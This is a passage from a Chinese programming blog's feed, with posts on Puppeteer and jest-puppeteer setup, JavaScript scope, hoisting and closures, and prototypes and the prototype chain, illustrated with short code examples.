class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">let detect = () =&gt; &#123;</span><br><span class="line">    // ... do some thing</span><br><span class="line">    return &apos;res&apos;;</span><br><span class="line">&#125;;</span><br><span class="line"> const html = await page.evaluate((fn) =&gt; &#123;</span><br><span class="line">        let res = eval(fn)();</span><br><span class="line">        return res;</span><br><span class="line">&#125;, detect.toString());</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：</p><p>页面注入脚本，监听事件失效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">let renderReady = () =&gt; &#123;</span><br><span class="line">      return new Promise((resolve) =&gt; &#123;</span><br><span class="line">          document.onreadystatechange = () =&gt; &#123;</span><br><span class="line">              if (document.readyState === &apos;complete&apos;) &#123;</span><br><span class="line">                  resolve();</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;;</span><br><span class="line">      &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">(async () =&gt; &#123;</span><br><span class="line">    await renderReady()</span><br><span class="line">    console.log(&apos;complete&apos;) // 永远也不会走到这一块来，进入到renderReady后就失效了</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><h2 id="jest-puppeteer"><a href="#jest-puppeteer" class="headerlink" title="jest-puppeteer"></a>jest-puppeteer</h2><p><a href="https://jestjs.io/docs/zh-Hans/puppeteer" target="_blank" rel="noopener">官方文档</a></p><p>使用puppeteer与jest搭配测试：</p><ul><li>依赖安装<code>npm install --save-dev jest-puppeteer puppeteer jest</code></li><li><code>package.json</code>添加<code>&quot;jest&quot;: {&quot;preset&quot;: &quot;jest-puppeteer&quot;}</code>依赖</li></ul><h3 id="TypeScript"><a href="#TypeScript" class="headerlink" title="TypeScript"></a>TypeScript</h3><p>在使用TypeScript中使用<code>puppeteer</code>测试需要注意一下几点：</p><blockquote><p>由于TypeScript需要进行类型检测所以需要在全局环境注入变量</p></blockquote><p>依赖安装：</p><p><code>@types/puppeteer</code>, <code>@types/jest-environment-puppeteer</code></p><p>配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    jest: &#123;</span><br><span class="line">        &quot;globalSetup&quot;: &quot;jest-environment-puppeteer/setup&quot;,</span><br><span class="line">        &quot;globalTeardown&quot;: &quot;jest-environment-puppeteer/teardown&quot;,</span><br><span class="line">        &quot;testEnvironment&quot;: &quot;jest-environment-puppeteer&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>指定输出版本</p></blockquote><p>若输出目标为<code>&quot;target&quot;: &quot;es5&quot;</code>，则会报各种依赖无法查找错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ReferenceError: __awaiter is not defined</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// tsconfig.json,文件配置</span><br><span class="line">&#123;</span><br><span class="line">  &quot;compilerOptions&quot;: &#123;</span><br><span class="line">    &quot;target&quot;: &quot;es2017&quot;,</span><br><span class="line">    // ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;待补充….&lt;/p&gt;
&lt;h2 id=&quot;centOs7-0无法运行问题&quot;&gt;&lt;a href=&quot;#centOs7-0无法运行问题&quot; class=&quot;h
      
    
    </summary>
    
      <category term="node" scheme="http://zhoushaw.github.io/categories/node/"/>
    
    
      <category term="node" scheme="http://zhoushaw.github.io/tags/node/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript系列之作用域与闭包</title>
    <link href="http://zhoushaw.github.io/2019/04/21/learning/font-end/js/JavaScript-closure/"/>
    <id>http://zhoushaw.github.io/2019/04/21/learning/font-end/js/JavaScript-closure/</id>
    <published>2019-04-21T01:39:35.000Z</published>
    <updated>2019-04-27T13:21:01.129Z</updated>
    
    <content type="html"><![CDATA[<h2 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h2><p>在进入作用域的讨论之前先明什么是作用域，通过一句话简单描述就是：<strong>一组明确定义的规则，它定义如何在某些位置存储变量，以及如何在稍后找到这些变量</strong></p><h3 id="词法作用域"><a href="#词法作用域" class="headerlink" title="词法作用域"></a>词法作用域</h3><p>作用域的工作方式有两种占统治地位的模型。其中的第一种是最最常见，在绝大多数的编程语言中被使用的。它称为 <strong>词法作用域</strong>，我们将深入检视它。另一种仍然被一些语言（比如 Bash 脚本，Perl 中的一些模式，等等）使用的模型，称为 <strong>动态作用域</strong>。</p><p>JavaScript采用的是<strong>词法作用域</strong>，这意味着<strong>作用域</strong>是编写时确定的，而不是运行时确定的，当然也可以通过<strong>欺骗</strong>来达到动态作用域，例如使用：<code>eval</code>、<code>with</code>等关键词</p><blockquote><p>词法分析</p></blockquote><p>JavaScript的代码运行，并不是像你想象的<strong>逐行编译</strong>，而是在进行编译前会进行<strong>词法分析</strong>。也就形成了我们所说的<strong>词法作用域</strong>。</p><p>可以通过下面的🌰来看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var value = 1;</span><br><span class="line"></span><br><span class="line">function foo() &#123;</span><br><span class="line">    console.log(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function bar() &#123;</span><br><span class="line">    var value = 2;</span><br><span class="line">    foo();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar();</span><br><span class="line"></span><br><span class="line">// 结果是 ???</span><br></pre></td></tr></table></figure><p>大多数人看到这个🌰第一个反应结果是：输出<code>2</code>，但是需要注意的是foo的作用域并不存在与<code>bar函数</code>中,因为JavaScript的<code>作用域</code>是词法作用域，所以并不能获取到bar函数中 <code>var value = 2</code>的声明。</p><p>下面我们来简单描述一下这段代码的执行过程：</p><ul><li>在全局环境下声明了<code>value变量</code>、<code>foo函数</code>、<code>bar函数</code></li><li>执行<code>bar函数</code>，</li><li>在函数<code>bar</code>内部声明了<code>value变量</code>并赋值为2</li><li>执行，<code>foo函数</code></li><li>在函数内寻找<code>value变量</code>声明，未找到,向上一层作用域继续寻找</li><li>在顶层作用域<code>window</code>下寻找到了<code>value</code>变量，若直到顶层作用域任未找到则报错</li><li>输出结果<code>1</code></li></ul><h3 id="动态作用域"><a href="#动态作用域" class="headerlink" title="动态作用域"></a>动态作用域</h3><p>上面已经描述了词法作用域的工作方式，这里我们来稍微讲讲与<strong>词法作用域</strong>完全对立的<strong>动态作用域</strong></p><p>我们这里就以bash为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">value=1</span><br><span class="line">function foo () &#123;</span><br><span class="line">    echo $value;</span><br><span class="line">&#125;</span><br><span class="line">function bar () &#123;</span><br><span class="line">    local value=2;</span><br><span class="line">    foo;</span><br><span class="line">&#125;</span><br><span class="line">bar // 2</span><br></pre></td></tr></table></figure><p>我们将上面代码保存为<code>scope.bash</code>的文件，通过执行<code>bash scope.bash</code>,最终输出<code>1</code></p><h3 id="变量提升"><a href="#变量提升" class="headerlink" title="变量提升"></a>变量提升</h3><p>在代码执行前，引擎会在执行前编译它。编译过程的一部分就是找到<strong>所有的声明</strong>，并将它们<strong>关联在合适的作用域上</strong></p><p>例如这段代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = 2;</span><br><span class="line"></span><br><span class="line">var a;</span><br><span class="line"></span><br><span class="line">console.log( a );</span><br></pre></td></tr></table></figure><p>当你看到 <code>var a = 2;</code> 时，你可能认为这是一个语句。但是 JavaScript 实际上认为这是两个语句：<code>var a;</code> 和 <code>a = 2;</code></p><ul><li>第一个语句，声明，是在编译阶段被处理的。</li><li>第二个语句，赋值，为了执行阶段而留在 原处。</li></ul><p>于是可以认为代码被处理成这样了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var a;</span><br><span class="line">a = 2;</span><br><span class="line"></span><br><span class="line">console.log( a );</span><br></pre></td></tr></table></figure><p>关于这种处理的一个有些隐喻的考虑方式是，变量和函数声明被从它们在代码流中出现的位置<strong>“移动”到代码的顶端</strong>。这就产生了<strong>“提升”</strong>这个名字</p><p>需要注意的是：提升是 <strong>以作用域为单位的</strong></p><h4 id="函数优先"><a href="#函数优先" class="headerlink" title="函数优先"></a>函数优先</h4><p>函数声明和变量声明都会被提升。但一个微妙的细节（可以 在拥有多个“重复的”声明的代码中出现）是，<strong>函数会首先被提升</strong>，<strong>然后才是变量</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">foo(); // 1</span><br><span class="line"></span><br><span class="line">var foo;</span><br><span class="line"></span><br><span class="line">function foo() &#123;</span><br><span class="line">console.log( 1 );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo = function() &#123;</span><br><span class="line">console.log( 2 );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>将会被转变成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( 1 );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(); // 1</span><br><span class="line"></span><br><span class="line">foo = function() &#123;</span><br><span class="line">console.log( 2 );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意那个 <code>var foo</code> 是一个重复（因此被无视）的声明，即便它出现在 <code>function foo()...</code> 声明之前，因为函数声明是在普通变量之前被提升的。</p><p>虽然<strong>多个/重复的 var</strong>声明实质上是被忽略的，但是后续的函数声明<strong>确实会覆盖前一个</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">    console.log(&apos;a&apos;);</span><br><span class="line">&#125;</span><br><span class="line">foo();</span><br><span class="line">function foo () &#123;</span><br><span class="line">    console.log(&apos;b&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上转变成了:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function foo () &#123;</span><br><span class="line">    console.log(&apos;b&apos;);</span><br><span class="line">&#125;</span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>闭包对于大多数熟练的JavaScript也算是一个模糊不清的概念，什么是闭包呢，闭包能给我们带来什么好处和坏处？</p><p>简单来说可以用一句话概括闭包的特性与作用：<strong>闭包就是函数能够记住并访问它的词法作用域，即使这个函数在它的词法作用域外执行</strong></p><blockquote><p>让我们跳进代码来说明这个定义：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( a ); <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><p>上面的代码段被认为是函数 bar() 在函数 foo() 的作用域上有一个 闭包.换一种略有不同的说法是，bar() 闭住了 foo() 的作用域。为什么？因为 bar() 嵌套地出现在 foo() 内部。就这么简单。</p><p>根据文章上面的<code>作用域</code>我们知道，函数的作用域是<strong>编写时定义</strong>的而不是运行时决定的，所以我们通过函数内部返回函数时，返回出来的函数的作用域链的<strong>起始位置</strong>依然是那个函数内部。由于在函数外部对函数内部值存在引用的关系，<strong>垃圾回收机制</strong>并不会将变量回收而是会一直在函数内部引用。</p><h3 id="闭包的特性"><a href="#闭包的特性" class="headerlink" title="闭包的特性"></a>闭包的特性</h3><p>根据闭包的定义我们能很容易记住其两大特点：</p><p>1、能够记住并访问它的词法作用域<br>2、即使在它的作用域外执行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> bar;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> baz = foo();</span><br><span class="line"></span><br><span class="line">baz(); <span class="comment">// 2 -- 哇噢，看到闭包了，伙计。</span></span><br></pre></td></tr></table></figure><ul><li><code>bar()</code> 被执行了，必然的。但是在这个例子中，它是在它被声明的词法作用域 外部 被执行的。</li><li><code>foo()</code> 被执行之后，一般说来我们会期望 <code>foo()</code> 的整个内部作用域都将消失，因为我们知道 引擎 启用了 垃圾回收器 在内存不再被使用时来回收它们。因为很显然 <code>foo()</code> 的内容不再被使用了，所以看起来它们很自然地应该被认为是 消失了。</li><li>但是闭包的“魔法”不会让这发生。内部的作用域实际上 依然 “在使用”，因此将不会消失。谁在使用它？函数 <code>bar()</code> 本身。</li><li>有赖于它被声明的位置，<code>bar()</code> 拥有一个词法作用域闭包覆盖着 <code>foo()</code> 的内部作用域，闭包为了能使 <code>bar()</code> 在以后任意的时刻可以引用这个作用域而保持它的存在。</li><li><code>bar()</code> 依然拥有对那个作用域的引用，而这个引用称为闭包。</li></ul><h3 id="闭包使用场景"><a href="#闭包使用场景" class="headerlink" title="闭包使用场景"></a>闭包使用场景</h3><h4 id="无处不在的闭包"><a href="#无处不在的闭包" class="headerlink" title="无处不在的闭包"></a>无处不在的闭包</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wait</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">setTimeout( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( message );</span><br><span class="line">&#125;, <span class="number">1000</span> );</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wait( <span class="string">"Hello, closure!"</span> );</span><br></pre></td></tr></table></figure><ul><li>我们拿来一个内部函数（名为 timer）将它传递给 setTimeout(..)。但是 timer 拥有覆盖 wait(..) 的作用域的闭包，实际上保持并使用着对变量 message 的引用。</li><li>在我们执行 wait(..) 一千毫秒之后，要不是内部函数 timer 依然拥有覆盖着 wait() 内部作用域的闭包，它早就会消失了。</li><li>在 引擎 的内脏深处，内建的工具 setTimeout(..) 拥有一些参数的引用，可能称为 fn 或者 func 或者其他诸如此类的东西。引擎 去调用这个函数，它调用我们的内部 timer 函数，而词法作用域依然完好无损。</li></ul><h4 id="循环-闭包"><a href="#循环-闭包" class="headerlink" title="循环 + 闭包"></a>循环 + 闭包</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123;</span><br><span class="line">setTimeout( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( i );</span><br><span class="line">&#125;, i*<span class="number">1000</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的精神是，我们一般将 期待 它的行为是分别打印数字“1”，“2”，……“5”，一次一个，一秒一个<br>实际上，如果你运行这段代码，你会得到“6”被打印5次，一秒一个。</p><p class="tip">我们试图 暗示 在迭代期间，循环的每次迭代都“捕捉”一份对 i 的拷贝。但是，虽然所有这5个函数在每次循环迭代中分离地定义，由于作用域的工作方式，它们 都闭包在同一个共享的全局作用域上，而它事实上只有一个 i</p><p>如何解决这个问题呢，定义一个新的作用域，在每次迭代时持有值 i 的一个拷贝。在新的匿名函数内部定义了一个新的局部作用域，i设置为了每次遍历时的值，这样便不会继续往上遍历了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">j</span>)</span>&#123;</span><br><span class="line">setTimeout( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( j );</span><br><span class="line">&#125;, j*<span class="number">1000</span> );</span><br><span class="line">&#125;)( i );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;作用域&quot;&gt;&lt;a href=&quot;#作用域&quot; class=&quot;headerlink&quot; title=&quot;作用域&quot;&gt;&lt;/a&gt;作用域&lt;/h2&gt;&lt;p&gt;在进入作用域的讨论之前先明什么是作用域，通过一句话简单描述就是：&lt;strong&gt;一组明确定义的规则，它定义如何在某些位置存储变量，以
      
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript系列之原型与原型链</title>
    <link href="http://zhoushaw.github.io/2019/04/20/learning/font-end/js/JavaScript-prototype/"/>
    <id>http://zhoushaw.github.io/2019/04/20/learning/font-end/js/JavaScript-prototype/</id>
    <published>2019-04-20T02:47:35.000Z</published>
    <updated>2019-04-27T13:21:01.129Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在JavaScript语言中实际上并不存在“类”，那么它是如何实现<strong>继承</strong>、<strong>多态</strong>、<strong>实例化</strong>等特性呢。它采用了与类不同的另一种技术，将其称之为<strong>原型</strong>，并通过<strong>原型链</strong>来实现<strong>继承</strong>、<strong>多态</strong>等特性。</p><p>但是需要注意的是JavaScript的<strong>继承</strong>,与Java的继承实际上有很大的区别，在Java语言中，<strong>继承</strong>是一个<strong>拷贝过程</strong>在物理地址上发生了拷贝，而JavaScript语言是通过<strong>原型链</strong>将其”链接”在一起，没有发生实际的拷贝。</p><div><a id="more"></a></div><h2 id="构造函数创建对象"><a href="#构造函数创建对象" class="headerlink" title="构造函数创建对象"></a>构造函数创建对象</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function Person() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">var person = new Person();</span><br><span class="line">person.name = &apos;Kevin&apos;;</span><br><span class="line">console.log(person.name) // Kevin</span><br></pre></td></tr></table></figure><p>在这个例子中，Person 就是一个构造函数，我们使用 new 创建了一个实例对象 person。</p><h2 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h2><h3 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a>prototype</h3><p>什么是原型呢？可以这样理解：每一个JavaScript对象(null除外)在创建的时候就会与之<strong>关联</strong>另一个对象，这个对象就是我们所说的<strong>原型</strong>，每一个对象都会从<strong>原型</strong>“<strong>继承</strong>“属性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Person() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">// 虽然写在注释里，但是你要注意：</span><br><span class="line">// prototype是函数才会有的属性</span><br><span class="line">Person.prototype.name = &apos;Kevin&apos;;</span><br><span class="line">var person1 = new Person();</span><br><span class="line">var person2 = new Person();</span><br><span class="line">console.log(person1.name) // Kevin</span><br><span class="line">console.log(person2.name) // Kevin</span><br></pre></td></tr></table></figure><p>这个函数的 prototype 属性到底指向的是什么呢？是这个函数的原型吗？</p><blockquote><p>上面例子中的解释：</p></blockquote><ul><li><code>Person</code>为构造函数</li><li><code>person1</code>、<code>person2</code>为<code>Person</code>的实例</li><li>构造函数的<code>prototype</code>属性指向，调用该构造函数而创建的实例的<strong>原型</strong></li><li><code>Person.prototype</code>为<code>person1</code>的<strong>原型</strong></li><li><code>person1</code>、<code>person2</code>继承了原型中的<code>name</code>属性</li></ul><p>用一张图解释<strong>构造函数</strong>与<strong>实例原型</strong>的关系</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190421_21bijk293k7244lgcie0j4fgbe5g2_1058x578.png" alt=""></p><h3 id="proto"><a href="#proto" class="headerlink" title="proto"></a><strong>proto</strong></h3><p>在上面的<strong>prototype</strong>中我们详细描述了<strong>构造函数</strong>如何与实例原型联系起来，那<strong>实例</strong>如何与<strong>实例原型</strong>之间如何联系呢？</p><p>在标准浏览器中构造函数的<strong>实例</strong>都拥有一个<code>__proto__</code>属性，通过这个<strong>实例</strong>上的<strong>属性</strong>可以找到这个实例的原型</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190421_1235011ggh2af3b01hj7941010l4l_990x668.png" alt=""></p><h3 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h3><p>每个原型都有一个 <strong>constructor</strong> 属性指向关联的构造函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function Person() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">console.log(Person === Person.prototype.constructor); // true</span><br></pre></td></tr></table></figure><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190421_1345h0c13a027556c48j45lj2ib2e_1104x556.png" alt=""></p><p>综上我们已经得出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Person() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var person = new Person();</span><br><span class="line"></span><br><span class="line">console.log(person.__proto__ == Person.prototype) // true</span><br><span class="line">console.log(Person.prototype.constructor == Person) // true</span><br><span class="line">// 顺便学习一个ES5的方法,可以获得对象的原型</span><br><span class="line">console.log(Object.getPrototypeOf(person) === Person.prototype) // true</span><br></pre></td></tr></table></figure><p>并且我们得出了：<code>构造函数</code>、<code>原型</code>、<code>实例</code>之间的关系</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190421_7b4h6c755ckcg3ig1719c71jjdlcc_1244x990.png" alt=""></p><h2 id="实例与原型"><a href="#实例与原型" class="headerlink" title="实例与原型"></a>实例与原型</h2><p>当我们读取<strong>对象</strong>属性时，若我们读取的对象不存在，将会自动到对象的<strong>原型</strong>上查找属性是否存在，如果属性不存在将会到<strong>原型的原型</strong>上查找，一直会找到null为止</p><p>通过🌰我们来进行说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function Person() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person.prototype.name = &apos;Kevin&apos;;</span><br><span class="line"></span><br><span class="line">var person = new Person();</span><br><span class="line"></span><br><span class="line">person.name = &apos;Daisy&apos;;</span><br><span class="line">console.log(person.name) // Daisy</span><br><span class="line"></span><br><span class="line">delete person.name;</span><br><span class="line">console.log(person.name) // Kevin</span><br></pre></td></tr></table></figure><p>第一次log输出时我们得到了预期输出<code>Daisy</code>,随后我们通过<code>delete</code>关键词删除了person实例上的<code>name</code>属性，第二次输出是通过查询发现person实例中并不存在属性<code>name</code>，到<code>person</code>实例的原型<code>Person.prototype</code>上进行查找找到<code>name</code>属性，查询终止。</p><p>若<code>Person.prototype</code>上任然不存在<code>name</code>属性呢，将会从何处进行查询?</p><h2 id="原型的原型"><a href="#原型的原型" class="headerlink" title="原型的原型"></a>原型的原型</h2><p>从<code>实例</code>与<code>实例原型</code>的关系里面可以知道，通过<code>__proto__</code>属性我们可以查询到期原型，那么原型的原型是什么呢?</p><p>通过这个🌰我们可以很清晰的知道，构造函数的原型的原型是<code>Object.prototype</code>,<code>Object.prototype</code>的原型是<code>null</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function Person()&#123;&#125;</span><br><span class="line">Person.prototype.__proto__ === Object.prototype // true</span><br><span class="line">Object.prototype.__proto__ === null // true</span><br></pre></td></tr></table></figure><p>通过上述的知识点我们可以构建成一幅完整的关系：</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190421_7cebll7hhc7ea3jfe102f2g4fj4fa_836x772.png" alt=""></p><p>其中<strong>青色</strong><code>__proto__</code>的线路就是我们通常所说的原型链</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://github.com/getify/You-Dont-Know-JS/blob/1ed-zh-CN/this%20%26%20object%20prototypes/ch5.md" target="_blank" rel="noopener">you don’t know js: this &amp; prototype</a></li><li><a href="https://github.com/mqyqingfeng/Blog/issues/2" target="_blank" rel="noopener">JavaScript深入之从原型到原型链</a></li></ul>]]></content>
    
    <summary type="html">
    
